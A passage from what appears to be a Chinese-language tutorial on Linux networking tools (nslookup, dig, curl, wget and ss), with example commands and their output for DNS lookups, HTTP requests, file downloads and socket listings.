    -&gt;  qq.com
        internet address = 61.129.7.47
        ttl = 92
    -&gt;  qq.com
        internet address = 123.151.137.18
        ttl = 92
    AUTHORITY RECORDS:
    ADDITIONAL RECORDS:
------------
Non-authoritative answer:
Name:   qq.com
Address: 183.3.226.35
Name:   qq.com
Address: 203.205.254.157
Name:   qq.com
Address: 61.129.7.47
Name:   qq.com
Address: 123.151.137.18
------------
    QUESTIONS:
        qq.com, type = AAAA, class = IN
    ANSWERS:
    AUTHORITY RECORDS:
    -&gt;  qq.com
        origin = ns1.qq.com
        mail addr = webmaster.qq.com
        serial = 1330914143
        refresh = 3600
        retry = 300
        expire = 86400
        minimum = 300
        ttl = 296
    ADDITIONAL RECORDS:
------------
</code></pre>
<h3 id="dig">dig<a hidden class="anchor" aria-hidden="true" href="#dig">¶</a></h3>
<p><em><strong>dig</strong></em>（Domain Information Groper) 执行DNS查找。默认情况下，dig查询通过 resolver ( <code>/etc/resolv.conf</code> ) 中列出的DNS地址，除非指定特定的name server。</p>
<h3 id="语法">语法<a hidden class="anchor" aria-hidden="true" href="#语法">¶</a></h3>
<pre><code class="language-bash">dig @server name type
</code></pre>
<h3 id="解析ip地址">解析IP地址<a hidden class="anchor" aria-hidden="true" href="#解析ip地址">¶</a></h3>
<p><code>dig</code> 通常不带参数地用于获取提供的DNS名称的IP地址。默认使用系统提供的DNS服务器用于DNS解析。</p>
<pre><code class="language-bash">dig www.qq.com

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; www.qq.com
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 40004
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;www.qq.com.                    IN      A

;; ANSWER SECTION:
www.qq.com.             132     IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.
ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A     109.244.236.76
ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A     109.244.236.65

;; Query time: 11 msec
;; SERVER: 183.60.83.19#53(183.60.83.19)
;; WHEN: Tue Jun 22 21:39:33 CST 2021
;; MSG SIZE  rcvd: 108
</code></pre>
<p><strong>dig命令输出包括以下部分</strong>：</p>
<ul>
<li><code>HEADER</code>：显示dig命令的版本号、dig命令使用的全局选项，以及一些附加的Header信息。</li>
<li><code>QUESTION SECTION</code>：显示dig像DNSserver发出的请求。即你请求的域名。这里使用dig命令获取<code>qq.com</code>使用的默认类型（A记录）</li>
<li><code>ANSWER SECTION</code>：显示从DNS接收到的应答。将显示<code>qq.com</code> 的A记录</li>
<li><code>ADDITIONAL SECTION</code>：显示<code>ADDITIONAL SECTION</code> 中列出的DNS服务器的ip地址。</li>
<li>底部的Stats部分显示一些dig命令统计信息，包括执行此查询所用的时间</li>
</ul>
<h3 id="仅显示应答部分">仅显示应答部分<a hidden class="anchor" aria-hidden="true" href="#仅显示应答部分">¶</a></h3>
<p>在大多数情况下，我们只需要查看dig的 <code>ANSWER SECTION</code>。可以仅打印该部分。</p>
<ul>
<li><code>+nocomments</code> 不显示注释行</li>
<li><code>+noauthority</code>  不显示<code>authority</code>部分</li>
<li><code>+noadditional</code>   不显示 <code>additional</code> 部分</li>
<li><code>+nostats</code>  不显示统计信息 <code>stats</code></li>
<li><code>+noanswer</code> 关掉<code>ANSWER</code>  部分，这里一般为想要的结果</li>
</ul>
<pre><code class="language-bash">dig www.qq.com \
    +nocomments \
    +noquestion \
    +noauthority \
    +noadditional \
    +nostats

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; www.qq.com +nocomments +noquestion +noauthority +noadditional +nostats
;; global options: +cmd
www.qq.com.             180     IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.
ins-r23tsuuf.ias.tencent-cloud.net. 31 IN A     109.244.236.65
ins-r23tsuuf.ias.tencent-cloud.net. 31 IN A     109.244.236.76
</code></pre>
<p>也可以使用 <code>+noal</code> 禁用所有不需要的部分，当然也会关掉 <code>answer</code> ，然后<code>+answer</code> 只显示 <code>answer</code>部分，这样看起来简洁些。</p>
<pre><code class="language-bash">dig www.qq.com \
    +noall \
    +answer
</code></pre>
<h3 id="查询mx记录-1">查询MX记录<a hidden class="anchor" aria-hidden="true" href="#查询mx记录-1">¶</a></h3>
<p>将MX作为参数，可以查询mx记录，可以使用 <code>-t</code> 增加类型</p>
<pre><code class="language-bash">dig qq.com  MX +noall +answer

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; qq.com MX +noall +answer
;; global options: +cmd
qq.com.                 4969    IN      MX      10 mx3.qq.com.
qq.com.                 4969    IN      MX      20 mx2.qq.com.
qq.com.                 4969    IN      MX      30 mx1.qq.com.
</code></pre>
<h3 id="查询ns记录-1">查询NS记录<a hidden class="anchor" aria-hidden="true" href="#查询ns记录-1">¶</a></h3>
<pre><code class="language-bash">dig qq.com NS +noall +answer
</code></pre>
<h3 id="查询所有记录">查询所有记录<a hidden class="anchor" aria-hidden="true" href="#查询所有记录">¶</a></h3>
<p>查看所有记录类型（A、MX、NS等），可以使用ANY作为类型。</p>
<pre><code class="language-bash">dig qq.com ANY +noall +answer

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; qq.com ANY +noall +answer
;; global options: +cmd
qq.com.                 83      IN      A       183.3.226.35
qq.com.                 83      IN      A       203.205.254.157
qq.com.                 83      IN      A       123.151.137.18
qq.com.                 83      IN      A       61.129.7.47
</code></pre>
<h3 id="仅查看记录的ip">仅查看记录的IP<a hidden class="anchor" aria-hidden="true" href="#仅查看记录的ip">¶</a></h3>
<p>有些场景下，仅需要域名的ip地址（即a记录），可以使用 <code> +short</code> 选项。</p>
<pre><code class="language-bash">dig qq.com +short
123.151.137.18
203.205.254.157
183.3.226.35
61.129.7.47
</code></pre>
<p><code> +short</code>  也可指定类型</p>
<pre><code class="language-bash">dig qq.com a +short

111.30.144.71
112.53.26.232

dig qq.com mx +short

10 mx3.qq.com.
20 mx2.qq.com.
30 mx1.qq.com.
</code></pre>
<h3 id="反向查找">反向查找<a hidden class="anchor" aria-hidden="true" href="#反向查找">¶</a></h3>
<p>可以使用<code>dig-x</code> 进行ip地址反向查找DNS，场景：如果只有一个外部ip地址，并且希望知道属于它的网站时。当然过了CDN的域名，只会显示对应CNAME</p>
<pre><code class="language-bash">dig -x 203.205.254.157 +short 
</code></pre>
<h3 id="使用指定dns来进行查询">使用指定DNS来进行查询<a hidden class="anchor" aria-hidden="true" href="#使用指定dns来进行查询">¶</a></h3>
<p>默认情况下，dig 使用 <code>/etc/resolv.conf</code> 文件中定义的DNS。如果要使用其他DNS执行查询，使用 <code>@dnsserver</code>。</p>
<pre><code class="language-bash">dig @8.8.8.8 www.qq.com +short

ins-r23tsuuf.ias.tencent-cloud.net.
109.244.236.76
109.244.236.65
</code></pre>
<h3 id="批量查询">批量查询<a hidden class="anchor" aria-hidden="true" href="#批量查询">¶</a></h3>
<p>进行批量查询时可以不用通过shell循环查询了，dig提供了批量查询的功能。使用<code>dig -f</code> 从文件内进行批量DNS查询。</p>
<pre><code class="language-bash">echo www.qq.com &gt; dns.txt
echo www.baidu.com &gt;&gt; dns.txt

dig -f dns.txt +noall +answer

www.baidu.com.          678     IN      CNAME   www.a.shifen.com.
www.a.shifen.com.       106     IN      A       14.215.177.39
www.a.shifen.com.       106     IN      A       14.215.177.38
www.qq.com.             60      IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.
ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A     109.244.236.65
ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A     109.244.236.76
</code></pre>
<p>也可以在命令行直接根多个域名即可，这样查询结果相比于shell循环查询会简洁很多。</p>
<pre><code class="language-bash">dig qq.com mx +noall +answer baidu.org ns +noall +answer

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; qq.com mx +noall +answer baidu.org ns +noall +answer
;; global options: +cmd
qq.com.                 4223    IN      MX      10 mx3.qq.com.
qq.com.                 4223    IN      MX      20 mx2.qq.com.
qq.com.                 4223    IN      MX      30 mx1.qq.com.
baidu.org.              300     IN      NS      ns4.brandshelter.net.
baidu.org.              300     IN      NS      ns3.brandshelter.info.
baidu.org.              300     IN      NS      ns2.brandshelter.de.
baidu.org.              300     IN      NS      ns5.brandshelter.us.
baidu.org.              300     IN      NS      ns1.brandshelter.com.
</code></pre>
<h3 id="设置dig默认选项">设置dig默认选项<a hidden class="anchor" aria-hidden="true" href="#设置dig默认选项">¶</a></h3>
<p>如别名 <code>alias</code> 一样，在查询中不想输入过多的 <code>+noall +answer</code> 之类，可以在 <code>$HOME/.digrc </code> 设置dig 的默认参数，这样只需和平时一样使用 <code>dig domain</code> 即可。</p>
<pre><code class="language-bash">cat &lt;&lt;EOF &gt;${HOME}/.digrc+noall +answerEOFdig www.qq.comwww.qq.com.             247     IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.ins-r23tsuuf.ias.tencent-cloud.net. 67 IN A     109.244.236.76ins-r23tsuuf.ias.tencent-cloud.net. 67 IN A     109.244.236.6
</code></pre>
<h2 id="curl">curl<a hidden class="anchor" aria-hidden="true" href="#curl">¶</a></h2>
<p><em><strong>curl</strong></em> 是Linux命令行工具，可以使用任何可支持的协议（如HTTP、FTP、IMAP、POP3、SCP、SFTP、SMTP、TFTP、TELNET、LDAP或FILE）在服务器之间传输数据。</p>
<p>在Linux下，curl是由 <code>libcurl</code> 提供驱动封装的cli客户端，在 <code>libcurl</code> 驱动下，curl可以一次传输多个文件。而PHP中的cURL函数，也是基于libcurl驱动的。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>curl</code>； <code>apt install curl</code></li>
<li>CentOS/Fedora: <code>curl</code>  ； <code>yum install -y curl</code></li>
<li>Apline：<code>curl</code> | <code>wget</code> ； <code>apk add --no-cache curl</code></li>
</ul>
</blockquote>
<h3 id="curl常用参数">cURL常用参数<a hidden class="anchor" aria-hidden="true" href="#curl常用参数">¶</a></h3>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-i</td>
<td style="text-align:left">默认隐藏响应头，此选项打印响应头与</td>
</tr>
<tr>
<td style="text-align:center">-I/&ndash;head</td>
<td style="text-align:left">仅显示响应头</td>
</tr>
<tr>
<td style="text-align:center">-o</td>
<td style="text-align:left">将相应内容保存指定路径下</td>
</tr>
<tr>
<td style="text-align:center">-O</td>
<td style="text-align:left">将相应内容保存在当前工作目录下</td>
</tr>
<tr>
<td style="text-align:center">-C</td>
<td style="text-align:left">断点续传，在 crtl + c终端后，可以从中断后部分开始</td>
</tr>
<tr>
<td style="text-align:center">-v</td>
<td style="text-align:left">显示请求头与响应头</td>
</tr>
<tr>
<td style="text-align:center">-x</td>
<td style="text-align:left">使用代理</td>
</tr>
<tr>
<td style="text-align:center">-X</td>
<td style="text-align:left">指定请求方法，POST GET PUT DELETE等</td>
</tr>
<tr>
<td style="text-align:center">-d</td>
<td style="text-align:left">如GET/POST/PUT/DELETE 需要传的表单参数，如JSON格式</td>
</tr>
<tr>
<td style="text-align:center">-u username:password</td>
<td style="text-align:left">当使用ftp有用户名可以使用-u，ftp允许匿名用户访问可以忽略</td>
</tr>
<tr>
<td style="text-align:center">–-limit-rate 2000B</td>
<td style="text-align:left">限速</td>
</tr>
<tr>
<td style="text-align:center">-T/&ndash;upload-file &lt;file&gt;</td>
<td style="text-align:left">上传一个文件</td>
</tr>
<tr>
<td style="text-align:center">-c/&ndash;cookie-jar &lt;file name&gt;</td>
<td style="text-align:left">将cookie下载到文件内</td>
</tr>
<tr>
<td style="text-align:center">-k/&ndash;insecure</td>
<td style="text-align:left">允许执行不安全的ssl连接，即调过SSL检测</td>
</tr>
<tr>
<td style="text-align:center"><code>--header 'Host: targetapplication.com'</code></td>
<td style="text-align:left">使用请求头</td>
</tr>
<tr>
<td style="text-align:center">-L/&ndash;location</td>
<td style="text-align:left">接受服务端redirect的请求</td>
</tr>
<tr>
<td style="text-align:center">-F</td>
<td style="text-align:left">上传二进制文件</td>
</tr>
</tbody>
</table>
<h3 id="限制下载速率">限制下载速率<a hidden class="anchor" aria-hidden="true" href="#限制下载速率">¶</a></h3>
<pre><code class="language-bash">curl --limit-rate 100K http://yourdomain.com/yourfile.tar.gz -O
</code></pre>
<h3 id="使用代理访问">使用代理访问<a hidden class="anchor" aria-hidden="true" href="#使用代理访问">¶</a></h3>
<pre><code class="language-bash">curl --proxy yourproxy:port https://yoururl.com
</code></pre>
<h3 id="限速访问">限速访问<a hidden class="anchor" aria-hidden="true" href="#限速访问">¶</a></h3>
<pre><code class="language-bash">curl www.baidu.com  --limit-rate 1k
</code></pre>
<h3 id="存储cookie和使用cookie">存储cookie和使用cookie<a hidden class="anchor" aria-hidden="true" href="#存储cookie和使用cookie">¶</a></h3>
<pre><code>$ curl --cookie-jar cnncookies.txt https://www.baidu.com/index.html -O -s -v
* About to connect() to www.baidu.com port 443 (#0)
*   Trying 14.215.177.39...
* Connected to www.baidu.com (14.215.177.39) port 443 (#0)
* Initializing NSS with certpath: sql:/etc/pki/nssdb
*   CAfile: /etc/pki/tls/certs/ca-bundle.crt
  CApath: none
* SSL connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
* Server certificate:
*       subject: CN=baidu.com,O=&quot;Beijing Baidu Netcom Science Technology Co., Ltd&quot;,OU=service operation department,L=beijing,ST=beijing,C=CN
*       start date: Apr 02 07:04:58 2020 GMT
*       expire date: Jul 26 05:31:02 2021 GMT
*       common name: baidu.com
*       issuer: CN=GlobalSign Organization Validation CA - SHA256 - G2,O=GlobalSign nv-sa,C=BE
&gt; GET /index.html HTTP/1.1
&gt; User-Agent: curl/7.29.0
&gt; Host: www.baidu.com
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Accept-Ranges: bytes
&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform
&lt; Connection: keep-alive
&lt; Content-Length: 2443
&lt; Content-Type: text/html
&lt; Date: Wed, 26 May 2021 12:14:41 GMT
&lt; Etag: &quot;58860402-98b&quot;
&lt; Last-Modified: Mon, 23 Jan 2017 13:24:18 GMT
&lt; Pragma: no-cache
&lt; Server: bfe/1.0.8.18
* Added cookie BDORZ=&quot;27315&quot; for domain baidu.com, path /, expire 1622117681
&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/
&lt; 
{ [data not shown]
* Connection #0 to host www.baidu.com left intact
</code></pre>
<pre><code># Netscape HTTP Cookie File# http://curl.haxx.se/docs/http-cookies.html# This file was generated by libcurl! Edit at your own risk..baidu.com      TRUE    /       FALSE   1622117681      BDORZ   27315
</code></pre>
<pre><code>$ curl --cookie cnncookies.txt https://www.baidu.com -s -v -o /dev/null
* About to connect() to www.baidu.com port 443 (#0)
*   Trying 14.215.177.39...
* Connected to www.baidu.com (14.215.177.39) port 443 (#0)
* Initializing NSS with certpath: sql:/etc/pki/nssdb
*   CAfile: /etc/pki/tls/certs/ca-bundle.crt
  CApath: none
* SSL connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
* Server certificate:
*       subject: CN=baidu.com,O=&quot;Beijing Baidu Netcom Science Technology Co., Ltd&quot;,OU=service operation department,L=beijing,ST=beijing,C=CN
*       start date: Apr 02 07:04:58 2020 GMT
*       expire date: Jul 26 05:31:02 2021 GMT
*       common name: baidu.com
*       issuer: CN=GlobalSign Organization Validation CA - SHA256 - G2,O=GlobalSign nv-sa,C=BE
&gt; GET / HTTP/1.1
&gt; User-Agent: curl/7.29.0
&gt; Host: www.baidu.com
&gt; Accept: */*
&gt; Cookie: BDORZ=27315
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Accept-Ranges: bytes
&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform
&lt; Connection: keep-alive
&lt; Content-Length: 2443
&lt; Content-Type: text/html
&lt; Date: Wed, 26 May 2021 12:23:27 GMT
&lt; Etag: &quot;58860402-98b&quot;
&lt; Last-Modified: Mon, 23 Jan 2017 13:24:18 GMT
&lt; Pragma: no-cache
&lt; Server: bfe/1.0.8.18
* Replaced cookie BDORZ=&quot;27315&quot; for domain baidu.com, path /, expire 1622118207
&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/  # 这里可以看到设置的cookie
&lt; 
{ [data not shown]
* Connection #0 to host www.baidu.com left intact
</code></pre>
<h3 id="使用代理">使用代理<a hidden class="anchor" aria-hidden="true" href="#使用代理">¶</a></h3>
<pre><code class="language-bash">curl -x socks5://127.0.0.1:10808 https://www.google.com
</code></pre>
<h3 id="使用applicationx-www-form-urlencoded表单类型">使用application/x-www-form-urlencoded表单类型<a hidden class="anchor" aria-hidden="true" href="#使用applicationx-www-form-urlencoded表单类型">¶</a></h3>
<p>这里使用的为<code>application/x-www-form-urlencoded</code></p>
<pre><code class="language-bash">curl -d &quot;option=value&amp;something=anothervalue&quot; -X POST https://{hostname}/
</code></pre>
<h3 id="使用json格式作为body">使用json格式作为body<a hidden class="anchor" aria-hidden="true" href="#使用json格式作为body">¶</a></h3>
<pre><code class="language-bash">curl  -H &quot;Content-Type: application/json&quot; -X POST https://host.com/ \
-d '  {   &quot;option&quot;: &quot;value&quot;,    &quot;something&quot;: &quot;anothervalue&quot; }'
</code></pre>
<h3 id="使用curl-上传文件">使用curl 上传文件<a hidden class="anchor" aria-hidden="true" href="#使用curl-上传文件">¶</a></h3>
<pre><code class="language-bash">curl {host}/api/v1/upimg -F &quot;file=@/Users/fungleo/Downloads/401.png&quot; \
-H &quot;token: 222&quot; -v
</code></pre>
<p>也可以指定<code>MIME</code>类型。如：</p>
<pre><code class="language-bash">curl -F 'file=@photo.png;type=image/png' https://{host}/api/v1/upimg
</code></pre>
<h3 id="curl输出的格式变量">curl输出的格式变量<a hidden class="anchor" aria-hidden="true" href="#curl输出的格式变量">¶</a></h3>
<p>curl -w参数提供了一些格式变量，可以达到紧紧获取某些数据</p>
<h3 id="仅获取http状态码">仅获取http状态码<a hidden class="anchor" aria-hidden="true" href="#仅获取http状态码">¶</a></h3>
<pre><code class="language-bash">curl -w %{http_code} www.baidu.com -o /dev/null -s
</code></pre>
<h3 id="获取整个请求的时间">获取整个请求的时间<a hidden class="anchor" aria-hidden="true" href="#获取整个请求的时间">¶</a></h3>
<p>获取整个请求的耗时，单位秒，显示单位 毫秒</p>
<pre><code class="language-bash">curl -w %{time_total} www.baidu.com -o /dev/null -s
</code></pre>
<h3 id="获取域名解析时间">获取域名解析时间<a hidden class="anchor" aria-hidden="true" href="#获取域名解析时间">¶</a></h3>
<pre><code class="language-bash">curl -w %{time_namelookup} www.baidu.com -o /dev/null -s
</code></pre>
<h3 id="获取tcp连接耗时">获取TCP连接耗时<a hidden class="anchor" aria-hidden="true" href="#获取tcp连接耗时">¶</a></h3>
<pre><code class="language-bash">curl -w %{time_connect} www.baidu.com -o /dev/null -s
</code></pre>
<h3 id="获取sslssh握手到远程主机耗时">获取SSL/SSH握手到远程主机耗时<a hidden class="anchor" aria-hidden="true" href="#获取sslssh握手到远程主机耗时">¶</a></h3>
<pre><code class="language-bash">curl -w %{time_appconnect} https://www.baidu.com -o /dev/null -s -v
</code></pre>
<h3 id="获取所有重定向的耗时">获取所有重定向的耗时<a hidden class="anchor" aria-hidden="true" href="#获取所有重定向的耗时">¶</a></h3>
<p>这里是从查找、连接、传输整个事务的完成到开始传送数据之前的耗时</p>
<pre><code class="language-bash">curl -w %{time_redirect} www.baidu.com -o /dev/null -s
</code></pre>
<h3 id="获得下载的总字节数">获得下载的总字节数<a hidden class="anchor" aria-hidden="true" href="#获得下载的总字节数">¶</a></h3>
<p>这里是http相应的body长度，而不是加上头部的大小</p>
<pre><code class="language-bash">curl -w %{size_download} www.baidu.com -o /dev/null -s
</code></pre>
<pre><code>$ curl -w %{size_download} www.baidu.com -o /dev/null -s
2381
</code></pre>
<h3 id="获得请求体送字节数">获得请求体送字节数<a hidden class="anchor" aria-hidden="true" href="#获得请求体送字节数">¶</a></h3>
<pre><code class="language-bash">curl -w %{size_request} www.baidu.com -o /dev/null -s
</code></pre>
<h3 id="获得传输中的连接数">获得传输中的连接数<a hidden class="anchor" aria-hidden="true" href="#获得传输中的连接数">¶</a></h3>
<pre><code class="language-bash">curl -w %{num_connects} www.baidu.com -o /dev/null -s
</code></pre>
<h3 id="获得重定向次数">获得重定向次数<a hidden class="anchor" aria-hidden="true" href="#获得重定向次数">¶</a></h3>
<pre><code class="language-bash">curl -w %{num_redirects} www.360buy.com -o /dev/null -s  -L
</code></pre>
<h3 id="获得ssl验证结果">获得SSL验证结果<a hidden class="anchor" aria-hidden="true" href="#获得ssl验证结果">¶</a></h3>
<p>0 表示是成功的</p>
<pre><code class="language-bash">curl -w %{ssl_verify_result} https://www.baidu.com -o /dev/null -s -L
</code></pre>
<h3 id="获得重定向的地址">获得重定向的地址<a hidden class="anchor" aria-hidden="true" href="#获得重定向的地址">¶</a></h3>
<p>当没有指定<code>-L</code>时，会返回被重定向后的地址</p>
<pre><code class="language-bash">curl -w %{redirect_url} https://www.360buy.com -o /dev/null -s 
</code></pre>
<h3 id="获得上传和下载速度">获得上传和下载速度<a hidden class="anchor" aria-hidden="true" href="#获得上传和下载速度">¶</a></h3>
<pre><code class="language-bash">curl -w %{speed_download} https://www.360buy.com -o /dev/null -s
curl -w %{speed_upload} https://www.360buy.com -o /dev/null -s
</code></pre>
<h3 id="根据自己需要拼接特定格式">根据自己需要拼接特定格式<a hidden class="anchor" aria-hidden="true" href="#根据自己需要拼接特定格式">¶</a></h3>
<pre><code class="language-bash">curl -w &quot;总共请求时长：%{time_total}\n总跳转次数：%{num_redirects}\n&quot; \
www.360buy.com -o /dev/null -s

总共请求时长：1.338总跳转次数：3
</code></pre>
<h2 id="wget">wget<a hidden class="anchor" aria-hidden="true" href="#wget">¶</a></h2>
<p><em><strong>wget</strong></em> 用于从web下载文件的命令行程序。wget，可以使用 <code>HTTP</code>、<code>HTTPS</code>和 <code>FTP</code> 协议下载文件。wget还允许下载多个文件、断点续传、限速、递归下载、后台下载、镜像网站等等。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>wget</code> ； <code>apt install wget</code></li>
<li>CentOS/Fedora: <code>wget</code>  ； <code>yum install -y wget</code></li>
<li>Apline： <code>wget</code> ；  <code>apk add --no-cache wget</code></li>
</ul>
</blockquote>
<h3 id="简单使用">简单使用<a hidden class="anchor" aria-hidden="true" href="#简单使用">¶</a></h3>
<p>使用wget最简单的方法是为它提供通过HTTP下载的文件的位置。如，下载文件。</p>
<pre><code class="language-bash">wget http://website.com/files/file.zip
</code></pre>
<p>该操作会将文件下载到工作目录中。</p>
<h3 id="下载文件并保存为指定名称">下载文件并保存为指定名称<a hidden class="anchor" aria-hidden="true" href="#下载文件并保存为指定名称">¶</a></h3>
<pre><code class="language-bash">wget –O [file_name] [URL]
</code></pre>
<h3 id="将文件下载到指定目录">将文件下载到指定目录<a hidden class="anchor" aria-hidden="true" href="#将文件下载到指定目录">¶</a></h3>
<p>默认情况下，wget下载的文件保存在用户所在工作目录中。使用 <code>–P</code> 可以将文件保存到指定路径。</p>
<pre><code class="language-bash">wget –P [wanted_directory] [URL]
</code></pre>
<h3 id="设置下载速度">设置下载速度<a hidden class="anchor" aria-hidden="true" href="#设置下载速度">¶</a></h3>
<p>在下载时可以设置下载时最大使用带宽，这样就不会使用主机全部的可用带宽。下载速度以 <code>k</code> 和 <code>m</code> 定义单位。</p>
<pre><code class="language-bash">wget --limit-rate [wanted_speed] [URL]

wget --limit-rate 1m http://us.download.nvidia.com/tesla/396.37/nvidia-diag-driver-local-repo-ubuntu1710-396.37_1.0-1_amd64.deb 
</code></pre>
<h3 id="断点续传">断点续传<a hidden class="anchor" aria-hidden="true" href="#断点续传">¶</a></h3>
<p>如果在下载时取消，wget提供了可以在中断前停止的地方继续下载。当下载文件时连接丢失时，这个非常有用。</p>
<pre><code class="language-bash">wget –c [URL]
</code></pre>
<h3 id="下载多个文件">下载多个文件<a hidden class="anchor" aria-hidden="true" href="#下载多个文件">¶</a></h3>
<p>wget也提供了下载多个文件的方法：</p>
<p>方法1：将需要下载的文件地址保存在文件中 使用 <code>-i</code> 指定文件，每个URL 单独占一行</p>
<pre><code class="language-bash">wget –i [file_name]
</code></pre>
<h3 id="下载网页网站镜像">下载网页（网站镜像）<a hidden class="anchor" aria-hidden="true" href="#下载网页网站镜像">¶</a></h3>
<p>使用 <code>–m</code> 下载URL中包含的所有连接，结果会保存为一个文件夹</p>
<pre><code class="language-bash">wget –m [URL]
</code></pre>
<h3 id="ftp下载">FTP下载<a hidden class="anchor" aria-hidden="true" href="#ftp下载">¶</a></h3>
<p>wget也可以下载FTP文件，当需要认证时，可以指定FTP的用户名和密码，然后接FTP地址：</p>
<pre><code class="language-bash">wget --ftp-user=[ftp_username] --ftp-password=[ftp_password] ftp://...
</code></pre>
<h3 id="后台下载">后台下载<a hidden class="anchor" aria-hidden="true" href="#后台下载">¶</a></h3>
<p>当下载文件很大时，wget也支持后台下载文件，在网络不稳定命令行断开时很实用。</p>
<pre><code class="language-bash">wget –b [URL]
</code></pre>
<p>可以使用命令 <code>tail –f wget –log </code> 来检查下载状态</p>
<h3 id="中断重试次数">中断重试次数<a hidden class="anchor" aria-hidden="true" href="#中断重试次数">¶</a></h3>
<p>当网络中断后，wget也支持设置在网络中断后尝试下载文件的次数：</p>
<pre><code class="language-bash">wget --tries=[number_of_tries] [URL]
</code></pre>
<h3 id="忽略证书验证">忽略证书验证<a hidden class="anchor" aria-hidden="true" href="#忽略证书验证">¶</a></h3>
<p>默认情况下，wget会验证服务端SSL/TLS证书是否有效。如果识别到无效的证书，它将拒绝下载。当在访问自签名证书时，可以使用<code>--no-check-certificate</code> 忽略验证</p>
<pre><code class="language-bash">wget --no-check-certificate [URL]
</code></pre>
<h3 id="自定义user-agent">自定义User-Agent<a hidden class="anchor" aria-hidden="true" href="#自定义user-agent">¶</a></h3>
<p>当服务端阻止了特定的 <code>User-Agent </code> 时，可以进行自定义 <code>User-Agent</code> 设置。</p>
<pre><code class="language-bash">wget --user-agent=”User Agent Here” “[URL]”
</code></pre>
<h3 id="实用技巧-下载内容到标准输出stdout">实用技巧-下载内容到标准输出stdout<a hidden class="anchor" aria-hidden="true" href="#实用技巧-下载内容到标准输出stdout">¶</a></h3>
<p>如在下载一个tar包时，一般都是wget 后 在tar 解压到对应目录，可以使用 <code>-O -</code> 将其下载到标准输出，<code>-q</code> 静默方式，通过管道直接解压到对应的路径下。</p>
<pre><code class="language-bash">wget -q -O - &quot;http://wordpress.org/latest.tar.gz&quot; | tar -xzf - -C /var/www
</code></pre>
<h2 id="ss">ss<a hidden class="anchor" aria-hidden="true" href="#ss">¶</a></h2>
<p><em><strong>ss</strong></em> (socket statistics) 命令行工具，用于在Linux系统上显示与网络套接字相关的信息。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li><strong>ss</strong></li>
<li>Ubuntu/Debian:  <code>iproute2</code>   ；<code>apt install iproute2</code></li>
<li>CentOS/Fedora: <code>iproute</code>  ；<code>yum install -y iproute</code></li>
<li>Apline：<code>iproute</code> ；<code>apk add --no-cache iproute</code></li>
</ul>
</blockquote>
<h3 id="查看所有连接">查看所有连接<a hidden class="anchor" aria-hidden="true" href="#查看所有连接">¶</a></h3>
<p>没有任何选项的ss命令只列出所有连接。</p>
<h3 id="查看listening-与-non-listening-ports">查看Listening 与 Non-listening Ports<a hidden class="anchor" aria-hidden="true" href="#查看listening-与-non-listening-ports">¶</a></h3>
<pre><code class="language-bash">ss -a
</code></pre>
<h3 id="查看监听-套接字列表">查看监听 套接字列表<a hidden class="anchor" aria-hidden="true" href="#查看监听-套接字列表">¶</a></h3>
<p>这里列出所有监听套接字，不关其是服务监听还是客户端请求占用</p>
<pre><code class="language-bash">ss -l
</code></pre>
<h3 id="查看所有tcp连接">查看所有TCP连接<a hidden class="anchor" aria-hidden="true" href="#查看所有tcp连接">¶</a></h3>
<p>这里只所有的tcp连接， 包含客户端与服务端</p>
<pre><code class="language-bash">ss -t
</code></pre>
<h3 id="查看所有监听类型的tcp连接">查看所有监听类型的tcp连接<a hidden class="anchor" aria-hidden="true" href="#查看所有监听类型的tcp连接">¶</a></h3>
<pre><code class="language-bash">ss -lt
</code></pre>
<h3 id="查看所有udp连接">查看所有udp连接<a hidden class="anchor" aria-hidden="true" href="#查看所有udp连接">¶</a></h3>
<pre><code class="language-bash">ss -ua
</code></pre>
<h3 id="查看监听类型的udp连接">查看监听类型的UDP连接<a hidden class="anchor" aria-hidden="true" href="#查看监听类型的udp连接">¶</a></h3>
<pre><code class="language-bash">ss -lu
</code></pre>
<h3 id="显示socket的pid进程id">显示socket的pid进程id<a hidden class="anchor" aria-hidden="true" href="#显示socket的pid进程id">¶</a></h3>
<pre><code class="language-bash">ss -p
</code></pre>
<h3 id="显示连接摘要信息">显示连接摘要信息<a hidden class="anchor" aria-hidden="true" href="#显示连接摘要信息">¶</a></h3>
<pre><code class="language-bash">ss -s
</code></pre>
